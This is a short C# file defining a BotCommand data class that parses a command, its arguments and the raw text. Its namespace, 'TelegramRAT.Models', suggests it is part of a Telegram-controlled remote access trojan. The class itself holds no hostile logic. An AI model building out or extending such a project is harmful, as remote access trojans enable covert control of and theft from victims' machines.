namespace TelegramRAT.Models;

internal sealed class BotCommand
{
    public required string Command { get; init; }
    public required string[] Arguments { get; init; }
    public required string RawText { get; init; }

    public string ArgumentString => string.Join(" ", Arguments);
    public bool HasArguments => Arguments.Length > 0;

    public override string ToString() => RawText;
}
